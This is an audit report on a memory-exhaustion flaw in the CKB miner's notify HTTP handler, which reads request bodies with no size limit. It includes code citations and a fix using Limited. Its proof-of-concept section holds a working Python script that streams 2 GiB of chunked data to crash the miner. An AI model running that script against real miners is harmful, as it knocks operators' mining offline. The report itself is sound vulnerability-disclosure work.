Audit Report

## Title
Unbounded HTTP request body buffering in miner notify server leads to OOM — (`miner/src/client.rs`)

## Summary
The `handle` function in `miner/src/client.rs` collects the full incoming HTTP request body into memory with no size cap. Any local process that can reach the configured notify listen address can send an arbitrarily large body, exhausting heap memory and OOM-killing the miner process.

## Finding Description
At line 14, the import is `use http_body_util::{BodyExt, Empty, Full};` — `Limited` is not imported and not used anywhere in the file. At line 362, `handle()` calls `BodyExt::collect(req).await?.aggregate()` directly on the raw `hyper::body::Incoming` with no interposed size guard. The `listen_block_template_notify` function (lines 234–271) accepts TCP connections unconditionally and spawns a Tokio task per connection that calls `handle()`. Each spawned task will buffer the entire request body before any application logic runs. There is no frame-count check, no `Content-Length` rejection, and no manual byte counter.

## Impact Explanation
Crashing the miner process halts block submission from that operator. This maps to **Note (0–500 points): Any local command line crash**. The miner (`ckb-miner`) is a standalone CLI tool separate from the CKB node process; crashing it does not crash a CKB node, cause consensus deviation, or damage the CKB economy. The impact is bounded to the miner process itself.

## Likelihood Explanation
The notify listen address is operator-configured. When bound to loopback (`127.0.0.1`), any unprivileged local process on the same host can open a TCP connection without credentials — no authentication, no token, no special privilege is required. When bound to `0.0.0.0`, any LAN peer qualifies. The attack is a single HTTP/1.1 request with a chunked body; it is repeatable and requires no prior knowledge beyond the port number.

## Recommendation
Wrap the incoming body with `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 4 * 1024 * 1024; // 4 MiB

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    // ...
}
```

`Limited` returns `Err(LengthLimitError)` once the threshold is exceeded, aborting the connection without buffering the full payload.

## Proof of Concept
```python
import socket

HOST, PORT = "127.0.0.1", <configured_notify_port>
s = socket.create_connection((HOST, PORT))
header = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: application/json\r\n\r\n"
).encode()
s.sendall(header)
chunk = b"A" * (1024 * 1024)
hex_len = f"{len(chunk):x}\r\n".encode()
for _ in range(2048):   # 2 GiB total
    s.sendall(hex_len + chunk + b"\r\n")
# Observe miner process OOM-killed
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** miner/src/client.rs (L14-14)
```rust
use http_body_util::{BodyExt, Empty, Full};
```

**File:** miner/src/client.rs (L206-224)
```rust
        if let Some(addr) = self.config.listen {
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
            self.handle.spawn(async move {
                client.listen_block_template_notify(addr).await;
            });
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```
